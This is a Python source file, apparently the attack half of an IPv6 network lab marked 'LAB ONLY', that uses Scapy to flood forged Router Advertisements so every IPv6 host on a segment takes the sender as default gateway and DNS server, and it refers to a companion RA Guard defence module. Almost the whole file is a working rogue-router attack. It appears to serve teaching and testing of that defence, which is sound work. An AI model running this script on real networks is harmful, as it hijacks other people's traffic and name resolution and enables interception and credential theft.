# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-ipv6-ra: rogue IPv6 Router Advertisement. LAB ONLY.

Multicasts forged RAs so every IPv6 host on the segment adopts the attacker as
default gateway and DNS (RDNSS) - the IPv6 equivalent of a rogue DHCP server.
RA Guard (see raguard.py) drops these on access ports.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    mac = s.get_if_hwaddr(args.iface)
    ra = (
        s.Ether(src=mac, dst="33:33:00:00:00:01")
        / s.IPv6(dst="ff02::1")
        / s.ICMPv6ND_RA(routerlifetime=args.lifetime)
        / s.ICMPv6NDOptPrefixInfo(prefix=args.prefix, prefixlen=64)
        / s.ICMPv6NDOptRDNSS(dns=[args.dns], lifetime=args.lifetime)
    )
    print(f"[*] flooding rogue RAs (prefix {args.prefix}, dns {args.dns}) on {args.iface}")
    s.sendp(ra, iface=args.iface, count=args.count, inter=args.interval, verbose=0)
    verdict("ALERT", f"advertised {args.prefix} with DNS {args.dns}")
    return 0
